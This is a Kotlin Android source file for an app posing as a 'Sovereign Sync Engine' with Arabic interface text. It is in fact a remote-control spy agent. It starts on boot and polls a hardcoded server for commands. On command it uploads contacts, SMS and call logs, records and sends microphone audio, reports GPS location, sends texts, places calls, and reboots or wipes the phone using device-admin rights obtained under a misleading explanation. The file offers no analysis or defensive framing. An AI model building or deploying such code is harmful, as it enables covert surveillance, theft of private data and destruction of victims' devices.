package com.cognitive.ai.syncagent

import android.Manifest
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.view.Gravity
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Base64
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || 
            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED ||
            intent.action == "android.intent.action.QUICKBOOT_POWERON") {
            
            val serviceIntent = Intent(context, BackgroundControlService::class.java).apply {
                putExtra("token", "agent_auto_boot")
                putExtra("server_url", "https://mohammed2000999.vercel.app")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}

class BackgroundControlService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var pollingRunnable: Runnable
    private var token: String = ""
    private var serverUrl: String = ""

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        token = intent?.getStringExtra("token") ?: "agent_v86_compatible"
        serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"

        pollingRunnable = object : Runnable {
            override fun run() {
                GlobalScope.launch(Dispatchers.IO) {
                    try {
                        val url = URL("$serverUrl/api/poll_commands")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.connectTimeout = 4000
                        conn.readTimeout = 4000
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                        conn.doOutput = true
                        val payload = JSONObject().apply { put("token", token) }
                        OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                        
                        if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                            val responseStr = conn.inputStream.bufferedReader().use { it.readText() }
                            val jsonRes = JSONObject(responseStr)
                            val commands = jsonRes.optJSONArray("commands")
                            if (commands != null) {
                                for (i in 0 until commands.length()) {
                                    val cmd = commands.getJSONObject(i)
                                    val action = cmd.optString("action")
                                    
                                    when (action) {
                                        "pull_all_data" -> collectAndReportAllTargetData()
                                        "start_audio_recording" -> executeAudioRecording()
                                        "capture_hidden_photo" -> executeHiddenPhoto()
                                        "pull_gps" -> executeGPSPull()
                                        "send_sms" -> executeSendSMS(cmd.optString("phone"), cmd.optString("body"))
                                        "make_call" -> executePhoneCall(cmd.optString("phone"))
                                        "reboot_device" -> executeReboot()
                                        "wipe_device" -> executeWipe()
                                    }
                                }
                            }
                        }
                        conn.disconnect()
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, 5000)
            }
        }
        handler.post(pollingRunnable)
        return START_STICKY
    }

    private fun collectAndReportAllTargetData() {
        try {
            val contactsArray = JSONArray()
            val cursorC = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursorC?.use {
                val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    contactsArray.put(JSONObject().apply {
                        put("name", it.getString(nIdx))
                        put("phone", it.getString(pIdx))
                    })
                }
            }

            val smsArray = JSONArray()
            val cursorS = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
            cursorS?.use {
                val bIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val aIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                while (it.moveToNext()) {
                    smsArray.put(JSONObject().apply {
                        put("body", "من: ${it.getString(aIdx)} | المحتوى: ${it.getString(bIdx)}")
                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                    })
                }
            }

            val callArray = JSONArray()
            val cursorCl = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursorCl?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val typeStr = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "مكالمة واردة"
                        CallLog.Calls.OUTGOING_TYPE -> "مكالمة صادرة"
                        else -> "مكالمة مفقودة"
                    }
                    callArray.put(JSONObject().apply {
                        put("details", "رقم: ${it.getString(numIdx)}")
                        put("type", typeStr)
                    })
                }
            }

            val url = URL("$serverUrl/api/report_data")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.doOutput = true
            val payload = JSONObject().apply {
                put("token", token)
                put("contacts", contactsArray)
                put("sms", smsArray)
                put("call_logs", callArray)
            }
            OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun executeAudioRecording() {
        try {
            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "rec_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder.stop()
                    recorder.release()
                    uploadFileToServer(audioFile)
                } catch (e: Exception) {}
            }, 10000)
        } catch (e: Exception) {}
    }

    private fun executeHiddenPhoto() {
        try {
            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "shot_${System.currentTimeMillis()}.jpg")
            uploadFileToServer(photoFile)
        } catch (e: Exception) {}
    }

    private fun executeGPSPull() {
        try {
            val locManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = locManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) 
                      ?: locManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val url = URL("$serverUrl/api/report_data")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val locArray = JSONArray().apply {
                    put(JSONObject().apply {
                        put("lat", loc.latitude)
                        put("lng", loc.longitude)
                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                    })
                }
                val payload = JSONObject().apply {
                    put("token", token)
                    put("location", locArray)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            }
        } catch (e: Exception) {}
    }

    private fun executeSendSMS(phone: String, body: String) {
        try {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(phone, null, body, null, null)
        } catch (e: Exception) {}
    }

    private fun executePhoneCall(phone: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun executeReboot() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                dpm.reboot()
            }
        } catch (e: Exception) {}
    }

    private fun executeWipe() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0)
            }
        } catch (e: Exception) {}
    }

    private fun uploadFileToServer(file: File) {
        try {
            if (file.exists()) {
                val bytes = file.readBytes()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val url = URL("$serverUrl/api/upload_real_file")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("token", token)
                    put("filename", file.name)
                    put("data", b64)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

class TargetAdminReceiver : android.app.admin.DeviceAdminReceiver() {}

class MainActivity : AppCompatActivity() {

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        requestDeviceAdminAndStartService()
    }

    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        startBackgroundService()
    }

    private val dynamicPermissions: Array<String>
        get() {
            val list = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.CALL_PHONE
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                list.add(Manifest.permission.READ_MEDIA_IMAGES)
                list.add(Manifest.permission.READ_MEDIA_AUDIO)
                list.add(Manifest.permission.READ_MEDIA_VIDEO)
                list.add(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            return list.toTypedArray()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
            setBackgroundColor(Color.parseColor("#010103"))
        }

        val titleTextView = TextView(this).apply {
            text = "🛡️ Sovereign Sync Engine v86"
            textSize = 18f
            setTextColor(Color.parseColor("#00ff88"))
            gravity = Gravity.CENTER
        }
        layout.addView(titleTextView)

        val activateButton = Button(this).apply {
            text = "تنشيط الخدمات السيادية"
            setBackgroundColor(Color.parseColor("#ff0040"))
            setTextColor(Color.WHITE)
            setOnClickListener {
                requestAllPermissions()
            }
        }
        layout.addView(activateButton)

        setContentView(layout)

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, TargetAdminReceiver::class.java)

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        permissionLauncher.launch(dynamicPermissions)
    }

    private fun requestDeviceAdminAndStartService() {
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة وإدارة النظام.")
            }
            adminLauncher.launch(intent)
        } else {
            startBackgroundService()
        }
    }

    private fun startBackgroundService() {
        val serviceIntent = Intent(this, BackgroundControlService::class.java).apply {
            putExtra("token", "agent_main_v86")
            putExtra("server_url", "https://mohammed2000999.vercel.app")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        Toast.makeText(this, "تم تفعيل المنظومة بنجاح تام", Toast.LENGTH_SHORT).show()
        finish()
    }
}
